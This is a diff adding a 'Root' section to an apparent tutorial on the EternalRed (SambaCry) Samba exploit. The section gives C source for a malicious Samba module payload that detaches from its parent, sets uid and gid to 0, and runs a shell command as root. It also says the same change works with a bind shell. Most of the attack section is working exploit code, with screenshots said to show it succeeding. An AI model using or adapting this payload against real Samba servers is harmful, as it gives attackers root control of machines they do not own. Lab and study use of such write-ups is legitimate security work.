@@ -303,3 +303,30 @@ gcc -shared -o execute.so execute.o
 ```
 
 ![commandExecution](/img/EternalRed/Commands.png)
+
+<h2>Root</h2>
+
+As you may see on the picture aboce, the directory created is owned by nobody. If you tried all the shells above, you will realise that whoami will give back nobody.
+It would be better if we could get root right? Just a little bit of modification is needed here. From the C payload, after detach but before command/shell execution, we can set our uid guid to 0 and become root. 
+Simply add setuid(0) and setgid(0) like this:
+```
+
+int samba_init_module(void)
+{
+    detachFromParent();
+    char command[50];
+    setuid(0);
+    setgid(0);
+
+    strcpy( command, "mkdir /tmp/testroot" );
+    system(command);
+    return 0;
+}
+
+```
+
+After comply and execute, the test folder is created as root.
+![root](/img/EternalRed/toroot.png)
+
+Works with the original bindshell too.
+![root](/img/EternalRed/rootbind.png)
